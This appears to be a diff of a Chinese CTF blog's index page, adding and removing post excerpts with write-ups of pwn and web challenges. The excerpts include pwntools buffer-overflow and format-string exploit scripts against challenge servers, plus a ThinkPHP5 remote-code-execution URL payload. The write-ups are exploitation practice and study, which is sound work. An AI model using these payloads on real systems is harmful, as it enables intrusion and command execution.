@@ -141,6 +141,199 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/">
+        <p class="h4 index-header">攻防世界pwn1</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.cnblogs.com/lxy8584099/p/11887235.html
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-15&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/">
+        <p class="h4 index-header">攻防世界stack2</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-11&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/10/CG-CTF-Stack-Overflow/">
+        <p class="h4 index-header">CG-CTF Stack Overflow</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">Stack Overflow先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh下面是exp；
+from pwn import *
+
+re = remote(&#39;182.254.217.142&#39;,10001)
+
+fgets_plt = 0x080483D0
+data_addr = 0x0804A024
+re.sendline(&#39;1&#39;)
+
+payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;
+
+re.sendline(payload1)
+
+payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)
+
+re.sendline(payload2)
+re.interactive()</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-10&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/">
+        <p class="h4 index-header">攻防世界forgot</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">forgot首先检查一下文件
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地址，其计算是按照字节来计算而不是位，所以做的时候要注意计算的答案)。由于v14的初始值为1，并且里面正则判断的时候没有关于大写字符的判断，我们就可以直接写入大写字符覆盖v2，并将v3覆盖为我们需要的函数的地址，就可以拿到flag。关注这个循环里面的内容，里面相当于正则表达式的判断，但是你仔细分析里switch中的函数时，可以发现没有判断大写字符的地方，我们可以注入大写字符，来达到不改变v14的值的效果。
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-08&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/">
+        <p class="h4 index-header">攻防世界Mary_Morton</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.cnblogs.com/gaonuoqi/p/11760970.html
+Welcome to the battle ! 
+[Great Fairy] level pwned 
+Select your weapon 
+1. Stack Bufferoverflow Bug 
+2. Format String Bug 
+3. Exit the battle 
+2
+aaaa-%x-%x-%x-%x-%x-%x-%x-%x
+aaaa-451173d0-7f-d652c260-0-0-61616161-252d7825-2d78252d可以看见偏移量是6个字节。又因为0x90-0x8=0x88,0x88/8+6=23.故exp：
+from pwn import *
+r=remote(&#39;111.198.29.45&#39;,53501)
+
+r.recvuntil(&#39;3. Exit the battle&#39;)
+r.sendline(&#39;2&#39;)
+
+r.sendline(&#39;%23$p&#39;)
+
+r.recvuntil(&#39;0</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-08&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/03/XCTF-int-overflow/">
+        <p class="h4 index-header">XCTF int_overflow</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.52pojie.cn/thread-1032448-1-1.html
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-03&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/02/01/jarvisoj-pwn-smashes/">
         <p class="h4 index-header">jarvisoj pwn smashes</p>
         
@@ -294,259 +487,6 @@ flag{dbbbc714-136c-42fe-9e</div>
           
             <a href="/tags/buuctf">buuctf</a>&nbsp;
           
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/">
-        <p class="h4 index-header">攻防世界CGfsb</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">CGfsb将文件checksec一下
-  py@ubuntu:~/Desktop/123$ checksec CGfsb
-  [*] &#39;/home/py/Desktop/123/CGfsb&#39;
-      Arch:     i386-32-little
-      RELRO:    Partial RELRO
-      Stack:    Canary found
-      NX:       NX enabled
-      PIE:      No PIE (0x8048000)用IDA观察一下
-int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int buf; // [esp+1Eh] [ebp-7Eh]
-  int v5; // [esp+22h] [ebp-7Ah]
-  __int16 v6; // [esp+26h] [ebp-76h]
-  char s; // [esp+28h] [ebp-74h]
-  unsigned int v8; // [esp+8Ch] </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-20&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-get-shell/">
-        <p class="h4 index-header">攻防世界pwn get_shell</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">get_shellpy@ubuntu:~$ cd Desktop/123
-py@ubuntu:~/Desktop/123$ checksec web_shell 
-[*] &#39;/home/py/Desktop/123/web_shell&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-py@ubuntu:~/Desktop/123$ 发现是64位有nx保护。先放到IDA pro进行反编译。
-  int __cdecl main(int argc, const char **argv, const char **envp)
-  {
-    puts(&quot;OK,this time we will get a shell.&quot;);
-    system(&quot;/bin/sh&quot;);
-    return 0;</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-20&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/19/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85/">
-        <p class="h4 index-header">黑客丛林之旅</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">level 1F12看脚本直接第二关
-level 2修改脚本为return true
-level 3在源码中没有发现什么。用bp拦截看看。将login=no改为login=yes
-level 4一点都不知道怎么做，看了看wp。莫斯科电码。
-
-iamok
-
-level 5直接base64解码没有技术含量。
-
-base64isok
-
-level 61、这关考察的是对默认端口的熟悉程度、2、Mstsc是Windows的远程桌面程序、其默认端口是33893、Vnc是Linux的远程桌面程序、其默认端口是5900、4、当Vnc连接一台服务器时、默认端口为5901、两台为5902、5、Mssql为1433、Mysql：3306、Oracle：1521、所以password=6260
-第七关：http://www.fj543.com/hack/?level=75901
-level 7页面是个gif图片，将图片下载到本地，用txt打开，看到结尾处有提示六幅图按照顺序是
-8bIGNOREwmUPPERCASEqneWORDS
-其中大写字母构成：
-IGNORE UPPERCASE WORDS
-也就是要忽略</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/">
-        <p class="h4 index-header">攻防世界高手进阶区PHP_rec</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
-
-?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
-
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/WEB%EF%BC%8Cphp">WEB，php</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/">
-        <p class="h4 index-header">Linux下安装UPX</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。
-本教程在 linux 下进行，理论上支持所有 linux 发型版。
-安装 upxupx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。
-本教程的下载地址可能不是最新版请访问 https://upx.github.io 下载最新版
-下载 upx
-
-
-
-wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz
-
-
-
-解压二进制
-
-
-
-tar -Jxf upx*.tar.xz
-
-
-
-为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量
-
-
-
-sudo cp upx*/upx /usr/bin
-
-
-
-然后就可以使用了
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-16&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
-        <p class="h4 index-header">pwnable.kr解题（一）</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">fdssh fd@pwnable.kr -p2222 (pw:guest)
-fd@pwnable:~$ cat fd.c
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-char buf[32];
-int main(int argc, char* argv[], char* envp[]){
-    if(argc&lt;2){
-        printf(&quot;pass argv[1] a number\n&quot;);
-        return 0;
-    }
-    int fd = atoi( argv[1] ) - 0x1234;
-    int len = 0;
-    len = read(fd, buf, 32);
-    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
-        printf(&quot;good job :)\n&quot;);
-        system(&quot;/bin/cat </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-15&nbsp;&nbsp;
-        
-        
         
       </div>
     </div>
